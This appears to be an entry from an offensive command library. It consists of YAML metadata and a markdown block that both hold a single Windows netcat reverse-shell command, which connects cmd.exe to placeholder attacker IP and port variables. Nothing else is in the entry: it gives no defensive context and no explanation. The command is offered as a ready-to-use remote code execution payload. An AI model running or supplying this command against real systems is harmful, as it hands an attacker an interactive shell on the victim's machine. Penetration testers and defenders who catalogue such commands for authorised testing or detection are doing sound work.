---
id: 66a7794d-36e5-4709-913a-4002cc785293
name: Execute Netcat from a Command Shell (cmd.exe) RCE
type: command
executor: bash
data: cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
output: null
created_at: '2019-12-05T22:28:02.926175+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Execute Netcat from a Command Shell (cmd.exe) RCE

```bash
cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```
